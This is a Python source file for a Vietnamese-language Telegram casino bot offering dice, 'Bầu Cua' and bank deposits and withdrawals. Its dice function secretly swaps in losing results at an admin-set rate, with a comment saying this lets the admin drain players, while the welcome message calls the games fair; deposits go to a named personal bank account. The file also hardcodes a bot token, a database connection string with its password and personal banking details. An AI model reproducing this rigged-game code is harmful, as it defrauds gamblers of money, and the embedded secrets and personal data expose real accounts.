import os, re, requests, json, random, time
from datetime import datetime
from telegram import (InlineKeyboardButton, InlineKeyboardMarkup, Update, 
                      ParseMode, ReplyKeyboardMarkup, KeyboardButton)
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
import psycopg2
from psycopg2.extras import RealDictCursor

# ==========================================
# ⚙️ CẤU HÌNH HỆ THỐNG
# ==========================================
TOKEN = "8755060469:AAEfrc5Gj5Crr6RxP9gnxDrehbL_W7NsjIE"
ADMIN_ID = 7816353760
DB_URL = "postgresql://postgres.naghdswctyyvzfdnforu:96886693002613@aws-1-ap-southeast-2.pooler.supabase.com:6543/postgres"

# Thông tin thanh toán & Cộng đồng
BANK_NAME = "MSB (Maritime Bank)"
BANK_ACC = "96886693002613"
BANK_USER = "NGUYEN THANH HOP"
GROUP_LINK = "https://t.me/TRUMTXCL" 
LOG_GROUP_ID = -1003778771904 

# ==========================================
# 🗄️ DATABASE ENGINE
# ==========================================
class Database:
    def __init__(self):
        self.conn = psycopg2.connect(DB_URL, sslmode='require')
        self.setup()

    def setup(self):
        with self.conn.cursor() as cur:
            # Bảng người dùng với đầy đủ thông số
            cur.execute('''CREATE TABLE IF NOT EXISTS users (
                uid BIGINT PRIMARY KEY, 
                username TEXT, 
                balance DOUBLE PRECISION DEFAULT 0,
                total_deposit DOUBLE PRECISION DEFAULT 0, 
                total_bet DOUBLE PRECISION DEFAULT 0,
                total_win DOUBLE PRECISION DEFAULT 0,
                bank_acc TEXT, 
                bank_name TEXT, 
                bank_user TEXT,
                ref_by BIGINT DEFAULT 0, 
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            
            # Bảng rút tiền
            cur.execute('''CREATE TABLE IF NOT EXISTS withdraw_requests (
                id SERIAL PRIMARY KEY, 
                uid BIGINT, 
                amount DOUBLE PRECISION, 
                status TEXT DEFAULT 'pending', 
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            
            # Bảng Giftcode chuyên nghiệp
            cur.execute('''CREATE TABLE IF NOT EXISTS giftcodes (
                code TEXT PRIMARY KEY, 
                amount REAL, 
                limit_use INTEGER, 
                used INTEGER DEFAULT 0)''')

            # Cấu hình Admin (Winrate, Bảo trì...)
            cur.execute("CREATE TABLE IF NOT EXISTS admin_config (key TEXT PRIMARY KEY, value TEXT)")
            cur.execute("INSERT INTO admin_config VALUES ('win_rate', '50') ON CONFLICT DO NOTHING")
            cur.execute("INSERT INTO admin_config VALUES ('min_withdraw', '50000') ON CONFLICT DO NOTHING")
            self.conn.commit()

    def query(self, sql, params=None, fetch=True):
        with self.conn.cursor(cursor_factory=RealDictCursor) as cur:
            cur.execute(sql, params)
            res = cur.fetchall() if fetch else None
            self.conn.commit()
            return res

db = Database()

# ==========================================
# 🎨 GIAO DIỆN UI/UX THỜI THƯỢNG
# ==========================================

def get_main_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🎲 TÀI XỈU"), KeyboardButton("⚖️ CHẴN LẺ")],
        [KeyboardButton("🦀 BẦU CUA"), KeyboardButton("🎡 VÒNG QUAY")],
        [KeyboardButton("💰 NẠP TIỀN"), KeyboardButton("💸 RÚT TIỀN")],
        [KeyboardButton("👤 CÁ NHÂN"), KeyboardButton("🤝 ĐẠI LÝ")],
        [KeyboardButton("🎁 GIFTCODE"), KeyboardButton("📞 HỖ TRỢ")]
    ], resize_keyboard=True)

def get_admin_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("📈 SET WINRATE"), KeyboardButton("💳 CỘNG/TRỪ TIỀN")],
        [KeyboardButton("📜 DUYỆT RÚT"), KeyboardButton("🎫 TẠO CODE")],
        [KeyboardButton("🏠 VỀ MENU CHÍNH")]
    ], resize_keyboard=True)

# ==========================================
# 🕹️ LOGIC GAMES (XANH CHÍN + CAN THIỆP)
# ==========================================

class CasinoLogic:
    @staticmethod
    def play_taixiu(choice, win_rate):
        # random thật
        dices = [random.randint(1, 6) for _ in range(3)]
        total = sum(dices)
        res = "tai" if total >= 11 else "xiu"
        
        # Can thiệp winrate nếu user quá đỏ hoặc admin muốn hút
        if random.randint(1, 100) > int(win_rate):
            if choice == "tai":
                dices = [random.randint(1, 3), random.randint(1, 3), random.randint(1, 4)]
            else:
                dices = [random.randint(4, 6), random.randint(4, 6), random.randint(4, 6)]
            total = sum(dices)
            res = "tai" if total >= 11 else "xiu"
            
        return (choice == res), dices, total, res

    @staticmethod
    def play_baucua(choice):
        items = ["Bầu", "Cua", "Tôm", "Cá", "Gà", "Nai"]
        results = [random.choice(items) for _ in range(3)]
        win_count = results.count(choice)
        return win_count, results

# ==========================================
# 📩 XỬ LÝ LỆNH NGƯỜI DÙNG
# ==========================================

user_context = {} # Lưu trạng thái cược: {uid: {'amount': 10000, 'game': 'tx'}}

def start(update: Update, context: CallbackContext):
    uid = update.effective_user.id
    name = update.effective_user.first_name
    
    # Check user cũ/mới
    check = db.query("SELECT * FROM users WHERE uid = %s", (uid,))
    if not check:
        db.query("INSERT INTO users (uid, username) VALUES (%s, %s)", (uid, name), fetch=False)

    welcome_text = (
        f"🔥 **CHÀO MỪNG ĐẾN VỚI TRUMTX - SIÊU PHẨM 2026** 🔥\n"
        f"────────────────────\n"
        f"👋 Xin chào: **{name}**\n"
        f"🆔 ID của bạn: `{uid}`\n\n"
        f"🎮 **Hệ thống sòng bài Telegram tự động:**\n"
        f"💎 Nạp rút siêu tốc qua MSB (Auto 30s).\n"
        f"🎲 Tài Xỉu, Chẵn Lẻ, Bầu Cua xanh chín.\n"
        f"🤝 Hoa hồng đại lý cực khủng cho người giới thiệu.\n"
        f"────────────────────\n"
        f"✨ *Hãy chọn một trò chơi bên dưới để bắt đầu kiếm lúa!*"
    )
    
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("💬 THAM GIA GROUP UY TÍN", url=GROUP_LINK)]])
    update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode=ParseMode.MARKDOWN)
    update.message.reply_text("👇 **CỘNG ĐỒNG TRUMTX:**", reply_markup=kb)

def handle_text(update: Update, context: CallbackContext):
    uid = update.effective_user.id
    text = update.message.text
    user = db.query("SELECT * FROM users WHERE uid = %s", (uid,))[0]

    # --- MENU TRÒ CHƠI ---
    if text == "🎲 TÀI XỈU":
        msg = (f"🎲 **SÒNG TÀI XỈU TRUMTX**\n"
               f"💰 Số dư: `{user['balance']:,.0f}đ`\n"
               f"────────────────────\n"
               f"Chọn mức cược bên dưới:")
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("10K", callback_data="bet_10000"), InlineKeyboardButton("50K", callback_data="bet_50000"), InlineKeyboardButton("100K", callback_data="bet_100000")],
            [InlineKeyboardButton("500K", callback_data="bet_500000"), InlineKeyboardButton("1M", callback_data="bet_1000000"), InlineKeyboardButton("TẤT TAY", callback_data="bet_all")],
            [InlineKeyboardButton("🔴 ĐẶT TÀI", callback_data="play_tx_tai"), InlineKeyboardButton("⚫ ĐẶT XỈU", callback_data="play_tx_xiu")]
        ])
        update.message.reply_text(msg, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)

    elif text == "🦀 BẦU CUA":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Bầu", callback_data="bc_Bầu"), InlineKeyboardButton("Cua", callback_data="bc_Cua"), InlineKeyboardButton("Tôm", callback_data="bc_Tôm")],
            [InlineKeyboardButton("Cá", callback_data="bc_Cá"), InlineKeyboardButton("Gà", callback_data="bc_Gà"), InlineKeyboardButton("Nai", callback_data="bc_Nai")],
            [InlineKeyboardButton("Mức: 20K", callback_data="bet_20000"), InlineKeyboardButton("Mức: 100K", callback_data="bet_100000")]
        ])
        update.message.reply_text("🦀 **BẦU CUA TÔM CÁ**\nChọn linh vật và mức cược:", reply_markup=kb)

    # --- TÀI CHÍNH ---
    elif text == "💰 NẠP TIỀN":
        msg = (f"🏦 **HỆ THỐNG NẠP TỰ ĐỘNG (MSB)**\n"
               f"────────────────────\n"
               f"🏧 Ngân hàng: **{BANK_NAME}**\n"
               f"🔢 Số tài khoản: `{BANK_ACC}`\n"
               f"👤 Chủ TK: **{BANK_USER}**\n"
               f"📝 Nội dung: `{uid}`\n"
               f"────────────────────\n"
               f"⚠️ **Lưu ý:** Chuyển đúng nội dung là ID của bạn để được cộng tiền tự động sau 30s!")
        update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

    elif text == "💸 RÚT TIỀN":
        if not user['bank_acc']:
            msg = ("⚠️ **BẠN CHƯA LIÊN KẾT NGÂN HÀNG**\n\n"
                   "Vui lòng liên kết để rút tiền về chính chủ.\n"
                   "👉 Cú pháp: `/link [STK] [TÊN_BANK] [TÊN_CHỦ_TK]`\n"
                   "Ví dụ: `/link 96886693002613 MSB NGUYEN THANH HOP`\n\n"
                   "❗ *Lưu ý: Chỉ liên kết 1 lần duy nhất!*")
            update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
        else:
            msg = (f"🏦 **QUẢN LÝ RÚT TIỀN**\n"
                   f"💰 Số dư: `{user['balance']:,.0f}đ`\n"
                   f"🏦 Bank: `{user['bank_name']} - {user['bank_acc']}`\n"
                   f"👤 Chủ: `{user['bank_user']}`\n"
                   f"────────────────────\n"
                   f"👉 Gõ lệnh: `/rut [số_tiền]` để tạo lệnh rút.")
            update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

    elif text == "👤 CÁ NHÂN":
        bank_status = f"{user['bank_name']} ({user['bank_acc']})" if user['bank_acc'] else "Chưa liên kết"
        msg = (f"👤 **HỒ SƠ NGƯỜI CHƠI**\n"
               f"────────────────────\n"
               f"🆔 ID: `{uid}`\n"
               f"💰 Số dư: `{user['balance']:,.0f}đ`\n"
               f"🏦 Ngân hàng: `{bank_status}`\n"
               f"📊 Tổng cược: `{user['total_bet']:,.0f}đ`\n"
               f"────────────────────")
        update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

    # --- ADMIN ---
    elif text == "/admin" and uid == ADMIN_ID:
        update.message.reply_text("👑 **CHÀO SẾP! HỆ THỐNG ĐÃ SẴN SÀNG.**", reply_markup=get_admin_keyboard())

    elif text == "🏠 VỀ MENU CHÍNH":
        update.message.reply_text("Đã quay lại sảnh.", reply_markup=get_main_keyboard())

# ==========================================
# 🎮 XỬ LÝ CLICK NÚT GAME & DUYỆT RÚT
# ==========================================

def handle_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    uid = query.from_user.id
    data = query.data
    user = db.query("SELECT * FROM users WHERE uid = %s", (uid,))[0]

    if uid not in user_context: user_context[uid] = {'bet': 10000}

    # Chọn mức cược
    if data.startswith("bet_"):
        val = data.split("_")[1]
        user_context[uid]['bet'] = user['balance'] if val == "all" else int(val)
        query.answer(f"Đã chọn mức cược: {user_context[uid]['bet']:,.0f}đ")

    # Chơi Tài Xỉu
    elif data.startswith("play_tx_"):
        choice = data.split("_")[2]
        bet = user_context[uid]['bet']
        
        if user['balance'] < bet or bet < 1000:
            return query.answer("Số dư không đủ hoặc mức cược không hợp lệ!", show_alert=True)

        wr = db.query("SELECT value FROM admin_config WHERE key='win_rate'")[0]['value']
        win, dices, total, res_text = CasinoLogic.play_taixiu(choice, wr)
        
        db.query("UPDATE users SET balance = balance - %s, total_bet = total_bet + %s WHERE uid = %s", (bet, bet, uid), fetch=False)
        
        if win:
            prize = bet * 1.95
            db.query("UPDATE users SET balance = balance + %s, total_win = total_win + %s WHERE uid = %s", (prize, prize, uid), fetch=False)
            result_msg = f"🎉 **THẮNG RỒI!**\n🎲 Kết quả: {dices[0]}-{dices[1]}-{dices[2]} = **{total} ({res_text.upper()})**\n💰 Nhận được: `+{prize:,.0f}đ`"
        else:
            result_msg = f"❌ **THẤT BẠI!**\n🎲 Kết quả: {dices[0]}-{dices[1]}-{dices[2]} = **{total} ({res_text.upper()})**\n💸 Mất: `-{bet:,.0f}đ`"
        
        query.edit_message_text(result_msg, reply_markup=query.message.reply_markup, parse_mode=ParseMode.MARKDOWN)

    # Duyệt rút tiền (Cho Admin)
    elif data.startswith("approve_"):
        if uid != ADMIN_ID: return
        rid = data.split("_")[1]
        req = db.query("SELECT * FROM withdraw_requests WHERE id = %s", (rid,))[0]
        db.query("UPDATE withdraw_requests SET status = 'approved' WHERE id = %s", (rid,), fetch=False)
        
        # Thông báo cho user
        context.bot.send_message(req['uid'], f"✅ **RÚT TIỀN THÀNH CÔNG**\nSố tiền `{req['amount']:,.0f}đ` đã được chuyển về tài khoản của bạn.")
        # Gửi log vào group
        log = (f"💸 **THÔNG BÁO RÚT TIỀN**\n"
               f"────────────────────\n"
               f"👤 Người chơi: ID `{req['uid']}`\n"
               f"💰 Số tiền: `{req['amount']:,.0f} VNĐ`\n"
               f"✅ Trạng thái: **Thành công**\n"
               f"🕒 {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}")
        context.bot.send_message(LOG_GROUP_ID, log, parse_mode=ParseMode.MARKDOWN)
        query.edit_message_text(f"✅ Đã duyệt lệnh #{rid}")

# ==========================================
# 🚀 KHỞI CHẠY HỆ THỐNG
# ==========================================

def link_bank(update: Update, context: CallbackContext):
    uid = update.effective_user.id
    try:
        stk, bank, name = context.args[0], context.args[1], " ".join(context.args[2:]).upper()
        db.query("UPDATE users SET bank_acc=%s, bank_name=%s, bank_user=%s WHERE uid=%s", (stk, bank, name, uid), fetch=False)
        update.message.reply_text(f"✅ **LIÊN KẾT THÀNH CÔNG!**\nSTK: `{stk}`\nBank: `{bank}`\nChủ: `{name}`", parse_mode=ParseMode.MARKDOWN)
    except:
        update.message.reply_text("❌ Sai cú pháp! Ví dụ: `/link 123456 MSB NGUYEN VAN A`")

def withdraw(update: Update, context: CallbackContext):
    uid = update.effective_user.id
    user = db.query("SELECT balance, bank_acc FROM users WHERE uid = %s", (uid,))[0]
    try:
        amount = float(context.args[0])
        if not user['bank_acc']: return update.message.reply_text("❌ Bạn chưa liên kết ngân hàng!")
        if amount < 50000: return update.message.reply_text("❌ Rút tối thiểu 50,000đ")
        if user['balance'] < amount: return update.message.reply_text("❌ Số dư không đủ!")
        
        db.query("UPDATE users SET balance = balance - %s WHERE uid = %s", (amount, uid), fetch=False)
        db.query("INSERT INTO withdraw_requests (uid, amount) VALUES (%s, %s)", (uid, amount), fetch=False)
        update.message.reply_text("✅ **GỬI YÊU CẦU THÀNH CÔNG!**\nVui lòng chờ Admin duyệt lệnh.")
        context.bot.send_message(ADMIN_ID, f"🔔 **LỆNH RÚT MỚI:** ID {uid} rút {amount:,.0f}đ")
    except:
        update.message.reply_text("❌ Cú pháp: `/rut [số_tiền]`")

if __name__ == '__main__':
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("link", link_bank))
    dp.add_handler(CommandHandler("rut", withdraw))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text))
    dp.add_handler(CallbackQueryHandler(handle_callback))
    
    print("💎 TRUMTX SUPREME V4 IS LIVE! NO LIMITS!")
    updater.start_polling()
    updater.idle()
